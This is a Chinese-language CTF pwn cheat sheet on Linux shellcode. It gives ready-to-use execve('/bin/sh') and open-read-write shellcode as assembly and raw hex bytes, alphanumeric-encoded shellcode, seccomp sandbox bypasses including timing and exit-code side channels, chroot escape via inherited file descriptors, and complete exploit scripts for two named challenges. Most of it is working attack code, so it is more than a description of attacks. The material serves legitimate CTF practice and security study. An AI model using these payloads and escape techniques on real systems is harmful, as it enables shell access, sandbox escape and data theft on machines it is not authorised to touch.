[TOC]

# 关于shellcode

`shellcode`是通过软件漏洞执行的代码，通常用十六进制机器码表示，因其能够使攻击者获得`shell`而得名。它常采用机器语言编写。在栈溢出攻击中，攻击者会覆盖原有地址为`shellcode`地址，让程序执行`shellcode`中的任意指令。为了成功执行此类攻击，通常会在编译时禁用`ASLR`、`NX`和`CANARY`选项，通过动态调试确定填充数据，确保溢出后跳转到 `shellcode`地址，执行攻击者的代码。

# shellcode通用性测试

## 测试代码

```c
// gcc -zexecstack -g -m32 -o shellcode-test shellcode-test.c

int main(){
    char shellcode[]="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA";
    void(*run)()=(void(*)())shellcode;
    run();
    return 0;
}
```

## 结果分析

编译后可以正确执行到`shellcode`并且成功`getshell`，说明事先将`shellcode`写入代码中也可以正常执行，证明了`shellcode`的通用性

# 常见系统调用号

| 函数名（Function） | 32 位系统调用号（十六进制） | 64 位系统调用号（十六进制） | 备注（Note）                                                 |
| ------------------ | --------------------------- | --------------------------- | ------------------------------------------------------------ |
| `open`             | 0x05                        | 0x02                        | 对应内核 `sys_open`                                          |
| `read`             | 0x03                        | 0x00                        | 对应内核 `sys_read`                                          |
| `write`            | 0x04                        | 0x01                        | 对应内核 `sys_write`                                         |
| `openat`           | 0x77                        | 0x101                       | 32 位需内核 ≥ 2.6.16，对应 `sys_openat`                      |
| `exit`             | 0x01                        | 0x3C                        | 32 位为 `sys_exit`，64 位为 `sys_exit`（编号差异）           |
| `mmap`             | 0xC0                        | 0x09                        | 32 位为 `sys_mmap2`（兼容大地址），64 位为 `sys_mmap`        |
| `sendfile`         | 0xB3                        | 0x28                        | 32 位为 `sys_sendfile64`（兼容大文件），64 位为 `sys_sendfile` |
| `ptrace`           | 0x4A                        | 0x16                        | 对应内核 `sys_ptrace`，权限需 `CAP_SYS_PTRACE` 或同 UID      |

# 使用pwntools生成shellcode

## 前提

输入长度足够大且没有其他特殊情况（例如题目提前修改`rsp`不合法等）时可以直接使用`pwntools`中的`shellcraft`模块生成`shellcode`

> 使用`shellcraft`需要先通过`context.arch`设置架构为`elf.arch`

## 生成shell

`32`位占`44`字节，`64`位占`48`字节

```python
context.arch = elf.arch
shellcode = asm(shellcraft.sh())
```

## 生成函数

用法：

```python
context.arch = elf.arch
shellcode = shellcraft.function(arg1, arc2...)
```

示例：

```python
context.arch = elf.arch
shellcode = shellcraft.open('./flag')
shellcode = shellcraft.cat('/flag', 1)
```

# 沙箱绕过

## 检测沙箱

使用`seccomp-tools`工具检测沙箱

```shell
$seccomp-tools dump ./pwn
```

在程序进行一定的输入之后开启的沙箱检测

```python
r = process(["seccomp-tools", "dump", "./pwn"])
```

触发沙箱会报错：bad system call

## 绕过沙箱

### 禁用execve

绕过方式：组合使用`open read write`获取`flag`

`32`位，`shellcode`占`55`字节

```python
shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('eax','esp',0x100)
shellcode += shellcraft.write(1,'esp',0x100)
shellcode = asm(shellcode)
```

`64`位，`shellcode`占`66`字节

```python
shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('rax','rsp',0x100)
shellcode += shellcraft.write(1,'rsp',0x100)
shellcode = asm(shellcode)
```

### 禁用open/read/write

绕过方式：利用其他函数替代`open`/`read`/`write`

#### openat + mmap + sendfile

```python
shellcode = shellcraft.openat(0,'/flag',0)
shellcode += shellcraft.mmap(0x10000,0x100,1,1,'eax',0)
shellcode += shellcraft.sendfile(1,3,0,0x100)
shellcode = asm(shellcode)
```

#### openat + preadv2 + writev

需要根据具体情况调整

```python
shellcode = asm('''
		/* openat(fd=-0x64, file='flag', oflag=0) */
        add rax, 0x62
        mov r12, rax
        mov rsi, rax
        mov rdi, -0x64
        /* call openat() */
        mov rax, 0x101 /* 0x101 */
        syscall
        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */
        mov rdi, 3
        mov rdx, 0x1
        add r12, 0x15
        mov rsi, r12
        /* call preadv2() */
        mov rax, 327
        syscall
        /* writev(fd=1, iovec=0x1337090, count=1) */
        mov rdi, 1
        mov rdx, 0x1
        /* call writev() */
        mov rax, 0x14
        syscall
''')
```

#### 其他替代函数

`open`：`fopen、creat、openat、fopen64、open64、freopen、openat2`

`read`：`pread、readv、preadv、splice、mmap、preadv2、mmap2`

`write`：`pwrite、send、writev`

### 禁用输出

#### 测信道

cmp：当爆破字符和`flag`对应字符一致时进入死循环，通过接收回显的时间间隔判断爆破是否正确

```python
from pwn import *
import string

# 这里的pwn只是为了演示流程，具体逻辑还得看题目
def pwn(p, index, ch):
	code = "push 0x67616c66; mov rdi, rsp; mov rsi, 0x0; mov rax, 0x2; syscall;"  # open
	code += "mov rdi, 0x3; mov rsi, rsp; mov rdx, 0x30; mov rax, 0x0; syscall;"   # read
	code += "cmp byte ptr[rsi+{}], {}; jz loop;".format(index, ch)                # cmp
	code += "xor edi, edi; mov rax, 60; syscall; loop: jmp loop;"                 # 等则进入死循环，否则exit(0)
	code = b"\\\\x90"*20+asm(code)  # 前面加了\\\\x90滑板

	p.send(code)

def main():
    flag = ""
    flag_str = string.printable
    for offset in range(0x30):
        index = 0
        while True:
            p = process("./babystack")
            try:
                ch = flag_str[index]
                print(">>>>>>>>>>> test ch {}".format(ch))
                pwn(p, offset, ord(flag_str[index]))
                p.recv(timeout=1)
                flag += ch
                print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> find flag: ", flag)
                p.close()
                index += 1
                break
            except Exception as e:
                # 捕获p.recv产生的错误
                print("="*10)
                print(e)
                print("="*10)
                try:
                    p.close()
                    index += 1
                except Exception as e:
                    # 捕获p.close产生的错误
                    print("="*10)
                    print(e)
                    print("="*10)
                    continue
        if flag[-1] == "}":
        	# 判断flag是否已经结束
            break

main()
```

exit：运行脚本中 `echo $?` 会输出上一个结束的进程的退出返回值

```shell
#!/bin/sh

echo "Starting the jail..."

/home/ctf/chtest

echo $?
```

可以设置读取到的 flag 字节为 rdi，然后 syscall 调用 exit，由于 exit 返回值在 0-255 所以只能逐位爆破

```assembly
mov al, 0x3c    ; rax = 0x3c (exit系统调用号)
mov edi, dword ptr [rsp+1] ; rdi = 栈上存储的flag字节值
syscall         ; 以flag字节值作为退出码执行exit
```

#### 利用32位函数

绕过方式：通过`retfq`切换架构为`32`位之后利用`32`位的函数，例如：

| 64位  | 32位  |
| ----- | ----- |
| fstat | open  |
| stat  | write |

#### 利用ptrace-待补充

# 其他限制绕过

## 限制输入长度

### 短字节shellcode

#### 32位

`getshell`-21字节

```python
# (execve("/bin/sh",NULL,NULL))
shellcode = asm("""
    push 0x68732f
    push 0x6e69622f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    push 11
    pop eax
    int 0x80
""")
```

`orw`-56字节

```python
shellcode = asm("""
    /*open(./flag)*/
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f2e
    mov eax,0x5
    mov ebx,esp
    xor ecx,ecx
    int 0x80
    /*read(fd,buf,0x100)*/
    mov ebx,eax
    mov ecx,esp
    mov edx,0x30
    mov eax,0x3
    int 0x80
    /*write(1,buf,0x100)*/
    mov ebx,0x1
    mov eax,0x4
    int 0x80
""")
```

无`\x00`截断`getshell`-21字节

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

`scanf`可读取`getshell`-41字节

```
\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh
```

使用 al ax 等短寄存器或用 push pop 缩短字节

```assembly
push 0x67616c66
push rsp
pop rsi
```

#### 64位

`getshell`-22字节

```python
shellcode = asm("""
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 0x3b
    pop rax
    syscall
""")
```

`orw`-43字节

```python
shellcode = asm("""
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
""")
```

无`\x00`截断且`scanf`可读-22字节

```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

### 再次构造read

绕过方式：在有限的输入中构造一次`read`向第一次输入的结尾再次输入`shellcode`，这种思路也可以用于绕过第一次输入时限制输入内容的情况，再次读的`shellcode`内容和长度不受限制。需要根据已知寄存器的值计算得到第一次输入结尾的位置，构造`read(0, addr, len)`，在高版本中`len`不能过大

### 利用栈或寄存器

利用寄存器中已有的值或从栈中`pop`栈顶的值得到一个离所需地址更进的地址，在此基础上构造所需地址

### \x00截断绕过长度判断

当题目采用`strlen`进行`shellcode`长度检测的时候可以在`shellcode`前加`\x00`开头的指令绕过长度检测。`64`位的指令如下，`32`位的话寄存器会改下名，`opcode`不变

```assembly
00 40 00                 add    BYTE PTR [rax+0x0],  al
00 41 00                 add    BYTE PTR [rcx+0x0],  al
00 42 00                 add    BYTE PTR [rdx+0x0],  al
00 43 00                 add    BYTE PTR [rbx+0x0],  al
00 45 00                 add    BYTE PTR [rbp+0x0],  al
00 46 00                 add    BYTE PTR [rsi+0x0],  al
00 47 00                 add    BYTE PTR [rdi+0x0],  al
```

### 利用汇编技巧

利用`xor rax, rax`代替`mov rax, 0`或`sub rax, rax`

利用`cdq`将`rdi`改成`rax`高位（`rax`恰好为`0`且需要改`rdi`为`0`）

利用`push`和`pop`代替`mov`

相对偏移跳转`asm(jmp $+14;)`或用online assenbler `jmp +14`

## 限制输入内容

### 仅数字字母

[alpha3](https://github.com/TaQini/alpha3) 项目可以实现输出可见 shellcode，安装和使用方法如下

```bash
$ git clone <https://github.com/TaQini/alpha3.git>
$ python sc.py > shellcode
$ cd alpha3
$ ./shellcode_x64.sh rax
```

使用脚本生成

```python
from pwn import *
import os

context(arch='amd64', os='linux')
context.log_level = 'debug'

fp = open("shellcode", "wb+")
fp.write(asm(shellcraft.sh()))
fp.close()

shellcode = os.popen("python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode").read()

print shellcode
```

**注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至 shellcode 时 rax 必须为 shellcode 的地址。设置为其他寄存器同理。**

- 32 位（70字节，eax）

  ```
  hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01
  ```

- 64 位（105字节，rax）

  ```
  Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103S0g0x4L1L0R2n1n0W7K7o0Y7K0d2m4B0U380a050W
  ```

- 64 位（271字节，rdi）

  ```
  Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7M1o1M170Y172y0h16110j100o0Z0J131k1217100Z110Y0i0Z0Y09110k0x2I100i0i020W130e0F0x0x0V0c0Z0u0A2n101k0t2K0h0i0t180y0D132F110M130y120c102n102q141N117K110a122k112H102O17031709102Z172q102q122L162L110e120S102u121N107o00
  ```

- 32 位

  ```
  PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA
  ```

- 64 位

  ```
  Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
  ```

### 禁用\x0f\x05

绕过思路：利用一次或多次`xor`通过数值计算得到`syscall`或者切换到`32`位架构使用`int 80`，还可以结合`xor`和`add`

示例：限制输入长度且限制`\x0f\x05`时利用`xor`构造`read`（末尾`push rax`仅为凑长度）

```assembly
push 0x66666963
pop rsi
xor qword ptr [rax + 0x20], rsi
push rbx
pop rdi
xor al, 0x22
push rax
pop rsi
push 0x66666963
pop rdx
push rbx
pop rax
push rax
push rax
push rax
push rax
push rax
push rax
\x6c\x6c\x66\x66
```

### 限制输入内容在一定范围内

#### 常见汇编对应的机器码

| 汇编                   | 机器码   | ASCII字符 |
| ---------------------- | -------- | --------- |
| push rax               | \x50     | P         |
| push rcx               | \x51     | Q         |
| push rdx               | \x52     | R         |
| push rbx               | \x53     | S         |
| push rsp               | \x54     | T         |
| push rbp               | \x55     | U         |
| push rsi               | \x56     | V         |
| push rdi               | \x57     | W         |
| pop rax                | \x58     | X         |
| pop rcx                | \x59     | Y         |
| pop rdx                | \x5a     | Z         |
| pop rsp                | \x5c     |           |
| pop rbp                | \x5d     |           |
| pop rsi                | \x5e     |           |
| pop rdi                | \x5f     |           |
| syscall                | \x0f\x05 |           |
| int 0x80               | \xcd\x80 |           |
| add byte ptr [rax], al | \x00\x00 |           |

## 限制权限

### 限制shellcode段没有读写权限

输入了`shellcode`之后将该段改成不可读写，可以利用`mprotect`给这段读写权限，并再次`read`读到该段

`mprotect`用法

```c
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);
```

说明：

指定的内存区间必须包含整个内存页(`4K`)，区间开始的地址 `start` 必须是一个内存页的起始地址，并且区间长度 `len` 必须是页大小的整数倍。

如果执行成功，则返回`0`；如果执行失败，则返回`-1` ，并且设置 `errno` 变量，说明具体因为什么原因造成调用失败

### 限制远程没有读flag的权限

先执行`setuid(0)`再执行`execve`进行`getshell`

### 远程flag文件名未知

先获取文件列表

```python
p += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(target) + p64(pop_rdx_rbx_ret) + p64(0x100) * 2 + p64(read_addr)
p += p64(pop_rdi_ret) + p64(target) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0x0) * 2 + p64(open_addr)
p += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404500) + p64(pop_rdx_rbx_ret) + p64(0x400) * 2 + p64(getdents64)
p += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(0x404500) + p64(pop_rdx_rbx_ret) + p64(0x400) * 2 + p64(write_addr)
```

### 限制输出流

绕过思路：`dup`重定向

```
shellcode = shellcraft.dup(0, 1)
shellcode = shellcraft.dup2(0, 1)
```

## 限制只能输入浮点数-待补充

## chroot逃逸

pwn 题里限制运行目录时可以进行 chroot 逃逸，例如

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  strcpy(path, "XXXXXX");
  if ( !mkdtemp(path) )
    __assert_fail("mkdtemp(jail_path) != NULL", "code.c", 0x3Bu, "main");
  puts("mkdir ok");
  if ( chroot(path) )
  {
    perror((const char *)&chroot);
    exit(-1);
  }
  ...
}
```

但提前打开了 flag 所在的目录，且 fd = 2，目录为 /，flag 在 /flag

```c
int securefd()
{
  close(2);
  open("/", 0);
  result = open("/flag", 0);
  for ( fd = 3; fd <= 1000; ++fd )
    result = close(fd);
  return result;
}
```

思路：openat(fd, dir, flag)，利用已知 fd 进行逃逸，例如上述题目可构造成 `openat(2,'flag',0)`

当使用子进程，这里的 flag 包含 CLONE_FILES 标志, 这表示父子进程共享文件打开表，那么就可以逃逸到父进程打开的目录下

```c
pid = syscall(__NR_clone, CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWUSER | CLONE_FILES | CLONE_NEWUTS | CLONE_NEWNET, 0, 0, 0, 0);
```



# 例题

### hgame-shellcodemaster

向`0x2333000`写入之后去掉写权限，并且改了所有寄存器

```c
mprotect(buf, 0x1000uLL, 4);
.text:0000000000401386 49 C7 C7 00 30 33 02          mov     r15, 2333000h
.text:000000000040138D 48 C7 C0 33 23 00 00          mov     rax, 2333h
.text:0000000000401394 48 C7 C3 33 23 00 00          mov     rbx, 2333h
.text:000000000040139B 48 C7 C1 33 23 00 00          mov     rcx, 2333h
.text:00000000004013A2 48 C7 C2 33 23 00 00          mov     rdx, 2333h
.text:00000000004013A9 48 C7 C4 33 23 00 00          mov     rsp, 2333h
.text:00000000004013B0 48 C7 C5 33 23 00 00          mov     rbp, 2333h
.text:00000000004013B7 48 C7 C6 33 23 00 00          mov     rsi, 2333h
.text:00000000004013BE 48 C7 C7 33 23 00 00          mov     rdi, 2333h
.text:00000000004013C5 49 C7 C0 33 23 00 00          mov     r8, 2333h
.text:00000000004013CC 49 C7 C1 33 23 00 00          mov     r9, 2333h
.text:00000000004013D3 49 C7 C2 33 23 00 00          mov     r10, 2333h
.text:00000000004013DA 49 C7 C3 33 23 00 00          mov     r11, 2333h
.text:00000000004013E1 49 C7 C4 33 23 00 00          mov     r12, 2333h
.text:00000000004013E8 49 C7 C5 33 23 00 00          mov     r13, 2333h
.text:00000000004013EF 49 C7 C6 33 23 00 00          mov     r14, 2333h
.text:00000000004013F6 41 FF E7                      jmp     r15
```

本题的思路是先调用`mprotect`给写权限，再重新读`shellcode`

相关汇编知识点：

```
|63..32|31..16|15-8|7-0|
               |AH.|AL.|
               |AX.....|
       |EAX............|
|RAX...................|
```

`cdq`：把`edx`的所有位都设成`eax`最高位的值

最后`orw`会存在地址问题，将`rsp`设置正常即可

exp

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')  #32位arch=‘i386’

file_name = './pwn'

li = lambda x : print('\\x1b[01;38;5;214m' + x + '\\x1b[0m')
ll = lambda x : print('\\x1b[01;38;5;1m' + x + '\\x1b[0m')

context.terminal = ['tmux','splitw','-h']

debug = 0
if debug:
    r = remote('node4.buuoj.cn', 26870)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

shellcode = asm('''
mov rdi, r15
xor eax, eax
cdq
mov al, 10
mov dl, 7
syscall
xor eax, eax
mov esi, edi
mov edi, eax
mov dl, 0xff
syscall
''')

print(len(shellcode))
dbg()
r.sendlineafter(b'bytes shellcode', shellcode)

shellcode = '''
        mov rsp, rsi
        add rsp, 0x300
        mov rcx, 0x2333500
        mov dword ptr[rcx], 0x67616c66
        mov rdi, rcx
        mov rsi, 0
        mov rdx, 0
        mov rax, 2
        syscall
        mov rax, 0
        mov rdi, 3
        mov rsi, 0x2333300
        mov rdx, 0x30
        syscall
        mov rax, 1
        mov rdi, 1
        mov rsi, 0x2333300
        mov rdx, 0x30
        syscall
'''

sleep(2)
r.sendline(b'\\x90' * 24 + asm(shellcode))

r.interactive()
```

### lilctf-trumanshow

chroot 逃逸 + exit 测信道爆破，利用已经打开的文件和 openat 进行 chroot 逃逸

```python
flag = "LILCTF{f5f4cc94-772e-493d-91e4-b34380452b16}"

for i in range(27, 0x40):
    r = remote('gz.imxbt.cn', 20815)
    sc = '''
    push 2;
    pop rdi;
    push 0x67616c66;
    push rsp;
    pop rsi;
    xor edx, edx;
    mov ax, 0x101;
    syscall;

    push rax;
    pop rdi;
    pop rdx;
    push rsp;
    pop rsi;
    xor eax, eax;
    syscall;
    '''
    sc += "mov edi, dword ptr [rsp+{}];".format(i)
    sc += "mov al, 0x3c;syscall;"
    p = asm(sc)
    r.send(p)

    r.recvuntil(b'time\n')
    c = r.recvline()[:-1]
    flag += chr(int(c))
    print(flag)
    r.close
```

